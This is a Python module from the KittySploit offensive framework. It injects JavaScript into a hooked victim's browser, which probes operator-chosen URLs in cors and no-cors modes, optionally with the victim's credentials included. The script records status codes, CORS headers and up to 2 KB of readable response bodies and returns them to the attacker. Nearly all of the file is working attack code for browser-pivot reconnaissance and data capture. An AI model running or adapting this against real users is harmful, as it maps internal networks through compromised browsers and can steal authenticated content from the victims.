from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "CORS Reachability Matrix",
		"description": "Probe a list of URLs from the hooked browser (cors / no-cors) and report reachability",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	urls = OptString(
		"",
		"Comma-separated URLs to probe (required)",
		True,
	)
	credentials = OptString(
		"omit",
		"Credentials mode for cors probes: omit | include",
		False,
	)
	timeout_ms = OptInteger(5000, "Per-request timeout (ms)", False)
	max_body = OptInteger(2048, "Max body preview bytes for readable cors responses", False)
	concurrency = OptInteger(4, "Parallel probes in the browser", False)

	def run(self):
		raw = str(self.urls or "").strip()
		if not raw:
			print_error("urls is required")
			return False

		targets = []
		for part in raw.split(","):
			u = part.strip()
			if u and u not in targets:
				targets.append(u)
		if not targets:
			print_error("No valid URLs")
			return False

		creds = str(self.credentials or "omit").strip().lower()
		if creds not in ("omit", "include"):
			print_error("credentials must be omit or include")
			return False

		timeout_ms = max(500, int(self.timeout_ms or 5000))
		max_body = max(0, int(self.max_body or 2048))
		concurrency = max(1, min(10, int(self.concurrency or 4)))
		est_s = max(15, int((len(targets) * 2 * timeout_ms) / (concurrency * 1000)) + 10)

		code_js = f"""
		(function() {{
			const URLS = {json.dumps(targets)};
			const CREDENTIALS = {json.dumps(creds)};
			const TIMEOUT_MS = {timeout_ms};
			const MAX_BODY = {max_body};
			const CONCURRENCY = {concurrency};

			function probeOne(url, mode) {{
				return new Promise(function(resolve) {{
					const started = Date.now();
					const controller = (typeof AbortController !== 'undefined') ? new AbortController() : null;
					const timer = setTimeout(function() {{
						if (controller) try {{ controller.abort(); }} catch (e) {{}}
					}}, TIMEOUT_MS);

					const init = {{
						method: 'GET',
						mode: mode,
						credentials: mode === 'cors' ? CREDENTIALS : 'omit',
						redirect: 'follow',
						cache: 'no-store'
					}};
					if (controller) init.signal = controller.signal;

					fetch(url, init)
						.then(function(resp) {{
							clearTimeout(timer);
							const headers = {{}};
							let headerError = null;
							try {{
								resp.headers.forEach(function(v, k) {{ headers[k] = v; }});
							}} catch (e) {{
								headerError = e.message || String(e);
							}}
							const interesting = {{}};
							['access-control-allow-origin', 'access-control-allow-credentials',
							 'access-control-allow-methods', 'access-control-expose-headers',
							 'content-type', 'server', 'www-authenticate'].forEach(function(h) {{
								if (headers[h]) interesting[h] = headers[h];
							}});

							const base = {{
								url: url,
								mode: mode,
								ok: true,
								status: resp.status,
								status_text: resp.statusText || '',
								type: resp.type,
								redirected: !!resp.redirected,
								final_url: resp.url || url,
								headers_readable: Object.keys(headers).length > 0,
								headers: interesting,
								header_error: headerError,
								elapsed_ms: Date.now() - started
							}};

							if (mode === 'cors' && MAX_BODY > 0 && resp.type !== 'opaque') {{
								return resp.text().then(function(text) {{
									base.body_preview = text.slice(0, MAX_BODY);
									base.body_length = text.length;
									resolve(base);
								}}).catch(function() {{ resolve(base); }});
							}}
							resolve(base);
						}})
						.catch(function(err) {{
							clearTimeout(timer);
							resolve({{
								url: url,
								mode: mode,
								ok: false,
								error: (err && err.name === 'AbortError') ? 'timeout' : (err.message || String(err)),
								elapsed_ms: Date.now() - started
							}});
						}});
				}});
			}}

			function runPool(jobs) {{
				return new Promise(function(resolve) {{
					const results = [];
					let i = 0, active = 0;
					function next() {{
						while (active < CONCURRENCY && i < jobs.length) {{
							const job = jobs[i++];
							active++;
							probeOne(job.url, job.mode).then(function(res) {{
								results.push(res);
								active--;
								if (results.length === jobs.length) resolve(results);
								else next();
							}});
						}}
					}}
					if (!jobs.length) resolve([]);
					else next();
				}});
			}}

			const jobs = [];
			URLS.forEach(function(u) {{
				jobs.push({{ url: u, mode: 'cors' }});
				jobs.push({{ url: u, mode: 'no-cors' }});
			}});

			return runPool(jobs).then(function(results) {{
				return JSON.stringify({{
					ok: true,
					origin: location.origin,
					page_url: location.href,
					credentials: CREDENTIALS,
					count: results.length,
					results: results
				}});
			}});
		}})();
		"""

		print_status(f"Probing {len(targets)} URL(s) x2 modes from browser...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(est_s))
		if not result:
			print_error("Failed to run CORS matrix")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("CORS Reachability Matrix")
		print_info(f"  Page origin: {data.get('origin')}")
		print_info(f"  Credentials: {data.get('credentials')}")

		by_url = {}
		for row in data.get("results") or []:
			by_url.setdefault(row.get("url"), []).append(row)

		for url, rows in by_url.items():
			print_info("-" * 60)
			print_info(f"  {url}")
			for row in rows:
				mode = row.get("mode")
				if row.get("ok"):
					msg = (
						f"    [{mode}] status={row.get('status')} type={row.get('type')} "
						f"{row.get('elapsed_ms')}ms"
					)
					if row.get("type") == "opaque":
						print_status(msg + " (opaque — reachable but unreadable)")
					else:
						print_success(msg)
					headers = row.get("headers") or {}
					if headers:
						acao = headers.get("access-control-allow-origin")
						if acao:
							print_warning(f"      ACAO: {acao}")
						for k, v in headers.items():
							if k != "access-control-allow-origin":
								print_info(f"      {k}: {v}")
					if row.get("body_preview"):
						preview = row["body_preview"].replace("\n", " ")[:180]
						print_info(f"      body: {preview}")
				else:
					print_info(f"    [{mode}] FAIL: {row.get('error')}")

		return True
